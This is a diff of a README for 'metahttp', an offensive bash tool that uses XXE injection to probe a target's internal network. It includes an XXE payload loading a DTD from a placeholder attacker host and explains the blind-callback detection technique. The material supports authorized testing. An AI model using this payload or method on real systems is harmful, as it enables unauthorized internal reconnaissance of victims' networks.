@@ -8,11 +8,11 @@ A bash script that automates the scanning of a target network for HTTP resources
 
 ## How it works
 
-Initially the script waits for the target application to load the DTDs from the HTTP server it hosts.
-
-Next the attacker triggers the XXE on the target server by submitting for example the following XML data:
+Initially, metahttp hosts an HTTP server that is responsible to deliver the payload DTDs to the target application.
+Then the attacker triggers the XXE to have the target server load the DTDs from the server hosted by metahttp.
+For example, the external DTDs could be loaded with the following XML document to the victim parser:
 ```xml
-<!DOCTYPE r SYSTEM "http://attacker_host/serveme.dtd"><r></r>
+<!DOCTYPE r SYSTEM "http://attacker_host:8080/serveme.dtd"><r></r>
 ```
 
 The script receives the request and responds with the following DTD:
@@ -27,8 +27,6 @@ After receiving the DTD, the XML parser will attempt to substitute the `trigger`
 The `trigger` parameter entity includes both `test_target` and `callback`. Now here we depend on the fact that XML parsers will normally process the parameter entities one by one. In case the substitution of an entity fails, they will not proceed with the substitution of the subsequent entities. So now, if we receive a callback to our server, it means that the substitution of the `callback` parameter entity was initiated which with its turn means that the resource pointed by the `test_target` exists.
 
 The above procedure is repeated for all the provided hosts/ports. Since there might be a big number of hosts/ports combinations, the step where the attacker has to trigger the XXE on the target server is automated  through the use of the "dispatcher". The dispatcher is an executable passed to metahttp through the -x option and is responsible for triggering the XXE on the target server. Couple of examples are provided in the dispatcher_examples folder.
-
-Finally it is noted that the script currently depends on the underlying XML parser processing external DTDs and entity substitutions but it should be possible to be adjusted to different XXE scenarios.
 
 ## Usage
 1. Local testing with a Java app on docker:
